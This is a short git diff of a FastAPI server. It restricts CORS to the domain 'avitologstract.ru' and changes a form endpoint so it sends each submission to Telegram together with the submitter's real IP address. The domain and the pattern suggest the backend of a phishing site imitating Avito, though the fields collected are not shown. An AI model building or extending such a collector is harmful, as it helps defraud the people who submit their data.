@@ -1,5 +1,5 @@
 import uvicorn
-from fastapi import FastAPI
+from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse, RedirectResponse
@@ -13,7 +13,7 @@ app = FastAPI()
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=['*'],
+    allow_origins=['avitologstract.ru'],
     allow_credentials=True,
     allow_methods=["GET", "POST"],
     allow_headers=["*"],
@@ -33,8 +33,12 @@ async def pingg():
     return RedirectResponse("/")
 
 @app.post("/frm")
-async def form(data: RequestModel):
-    status_code = await TG_MANAGER.send(await format("127.0.0.1", data))
+async def form(data: RequestModel, request: Request):
+    status_code = await TG_MANAGER.send(
+        await format(
+            str(request.client.host),
+            data)
+    )
     return {
         "status": status_code,
         "message": "Успешно" if status_code >= 200 and status_code < 300 else "Ошибка"
